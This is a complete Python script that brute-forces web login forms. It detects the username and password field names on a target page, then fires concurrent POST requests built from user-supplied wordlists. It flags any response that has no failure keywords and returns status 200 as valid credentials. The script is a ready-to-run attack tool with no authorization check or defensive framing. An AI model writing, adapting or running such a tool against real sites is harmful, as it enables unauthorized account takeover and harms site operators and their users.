import aiohttp
import asyncio
import sys
import time
import logging
import requests
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

# User inputs
TARGET_URL = input("Enter the target login URL: ").strip()
USE_USERNAME_WORDLIST = input("Use a username wordlist? (yes/no): ").strip().lower() == "yes"
USE_PASSWORD_WORDLIST = input("Use a password wordlist? (yes/no): ").strip().lower() == "yes"

# Load wordlists
def load_wordlist(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        logging.error(f"File not found: {filepath}")
        sys.exit()

# Get usernames
if USE_USERNAME_WORDLIST:
    USERNAME_WORDLIST_PATH = input("Enter username wordlist path: ").strip()
    usernames = load_wordlist(USERNAME_WORDLIST_PATH)
else:
    usernames = [input("Enter a single username: ").strip()]

# Get passwords
if USE_PASSWORD_WORDLIST:
    PASSWORD_WORDLIST_PATH = input("Enter password wordlist path: ").strip()
    passwords = load_wordlist(PASSWORD_WORDLIST_PATH)
else:
    passwords = [input("Enter a single password: ").strip()]

# Generic Error Indicators for Failed Login
ERROR_INDICATORS = input("Enter all keywords indicating failed login (comma-separated): ").strip().lower().split(',')

CONCURRENT_REQUESTS = int(input("Enter the number of concurrent requests: "))

# Detect login fields dynamically
def detect_login_fields(url):
    """Automatically detect username and password field names on a login page."""
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")

        login_form = None
        password_field = None
        username_field = None

        # Find the form that contains a password field
        for form in soup.find_all("form"):
            if form.find("input", {"type": "password"}):
                login_form = form
                break

        if not login_form:
            logging.error("❌ No login form detected!")
            return None

        # Identify username and password fields
        for input_tag in login_form.find_all("input"):
            input_type = input_tag.get("type", "").lower()
            input_name = input_tag.get("name", "").lower()
            input_id = input_tag.get("id", "").lower()

            if input_type == "password":
                password_field = input_name if input_name else input_id
            
            if input_type == "text" or "user" in input_name or "email" in input_name:
                username_field = input_name if input_name else input_id

        form_action = login_form.get("action", "").strip()
        if not form_action:
            form_action = url

        if username_field and password_field:
            logging.info(f"✅ Detected Login Fields:")
            logging.info(f"   🔹 Username Field: {username_field}")
            logging.info(f"   🔹 Password Field: {password_field}")
            logging.info(f"   🔹 Form Action: {form_action}")

            return {
                "username_field": username_field,
                "password_field": password_field,
                "form_action": form_action
            }
        else:
            logging.error("❌ Could not detect username or password fields!")
            return None

    except requests.exceptions.RequestException as e:
        logging.error(f"⚠️ Error fetching login page: {e}")
        return None

# Get dynamic login form fields
detected_fields = detect_login_fields(TARGET_URL)
if detected_fields:
    USERNAME_FIELD = detected_fields["username_field"]
    PASSWORD_FIELD = detected_fields["password_field"]
    FORM_ACTION = detected_fields["form_action"]
    TARGET_URL = FORM_ACTION
else:
    logging.error("Failed to detect login fields. Exiting...")
    sys.exit()

logging.info(f"Starting brute force attack on {TARGET_URL}")

async def attempt_login(session, username, password):
    """Attempt a login and return credentials if successful."""
    data = {USERNAME_FIELD: username, PASSWORD_FIELD: password}
    start_time = time.time()
    try:
        async with session.post(TARGET_URL, data=data) as response:
            text = await response.text()
            response_time = time.time() - start_time

            text = text.lower().strip()
            logging.info(f"Tested {username}:{password} | Response time: {response_time:.2f}s")

            if any(indicator.strip() in text for indicator in ERROR_INDICATORS):
                logging.warning(f"[FAILED] {username}:{password}")
                return "failed"

            if response.status in [401, 403, 400]:
                logging.warning(f"[FAILED - STATUS CODE] {username}:{password} | Status: {response.status}")
                return "failed"

            if response.status == 200:
                logging.info(f"[SUCCESS] Valid credentials found: {username} | {password}")
                return username, password
    except aiohttp.ClientError as e:
        logging.error(f"Connection error: {e}")
    return None

async def brute_force():
    """Execute brute force attempts asynchronously."""
    connector = aiohttp.TCPConnector(limit_per_host=CONCURRENT_REQUESTS)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)

        async def worker(username, password):
            async with semaphore:
                return await attempt_login(session, username, password)

        for username in usernames:
            for password in passwords:
                tasks.append(worker(username, password))
                if len(tasks) >= CONCURRENT_REQUESTS:
                    results = await asyncio.gather(*tasks)
                    tasks.clear()

                    for result in results:
                        if isinstance(result, tuple):
                            logging.info(f"[+] Valid credentials found: {result}")
                            return

        results = await asyncio.gather(*tasks)
        for result in results:
            if isinstance(result, tuple):
                logging.info(f"[+] Valid credentials found: {result}")
                return

    logging.info("[!] Brute force complete. No valid credentials found.")

if __name__ == "__main__":
    asyncio.run(brute_force())
